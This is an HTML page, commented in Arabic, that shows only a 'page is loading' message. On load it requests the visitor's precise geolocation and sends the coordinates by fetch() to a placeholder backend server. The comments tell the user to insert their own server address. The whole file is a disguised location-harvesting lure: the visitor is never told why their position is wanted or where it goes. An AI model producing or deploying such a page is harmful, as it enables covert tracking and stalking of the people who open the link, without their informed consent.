<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحديد الموقع</title>
</head>
<body>

    <h2>جاري تحميل الصفحة...</h2>

    <script>
        // هذا الكود يشتغل أول ما الصفحة تفتح تلقائياً
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // 1. التقطنا الإحداثيات بنجاح بعد ما وافق المستخدم
                        let lat = position.coords.latitude;
                        let lon = position.coords.longitude;

                        // 2. إرسالها فوراً للسيرفر الخاص بك
                        sendToServer(lat, lon);
                    },
                    function(error) {
                        console.log("تم رفض الإذن أو حدث خطأ.");
                    },
                    { enableHighAccuracy: true }
                );
            }
        };

        function sendToServer(lat, lon) {
            // ملاحظة: الرابط أدناه يجب أن يكون رابط السيرفر الحقيقي الخاص بك
            fetch('https://your-backend-server.com/api/save-location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    latitude: lat,
                    longitude: lon
                })
            })
            .then(response => {
                if (response.ok) {
                    console.log("تم إرسال الموقع للسيرفر بنجاح");
                } else {
                    console.log("السيرفر رفض الطلب أو حدث خطأ");
                }
            })
            .catch(err => {
                console.log("مشكلة في الاتصال بالسيرفر");
            });
        }
    </script>

</body>
</html>
